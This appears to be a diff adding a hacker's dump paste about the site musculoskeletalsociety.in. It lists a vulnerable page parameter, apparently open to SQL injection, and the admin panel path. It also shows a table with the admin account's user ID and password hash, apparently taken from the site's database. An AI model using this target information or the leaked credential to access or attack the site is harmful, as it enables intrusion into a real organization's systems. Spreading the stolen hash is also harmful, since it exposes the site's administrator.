@@ -1,0 +1,11 @@
+Web site: http://musculoskeletalsociety.in
+vulnerability: http://musculoskeletalsociety.in/page.php?id=6
+panel: http://musculoskeletalsociety.in/admin
+
+Dumped:
+
++---------+----------+--------+----------------------------------+------+
+| user_id | entry_id | status | password                         | type |
++---------+----------+--------+----------------------------------+------+
+| admin   | 1        | 1      | 25a41cec631264f04815eda23dc6edd9 | 0    |
++---------+----------+--------+----------------------------------+------+
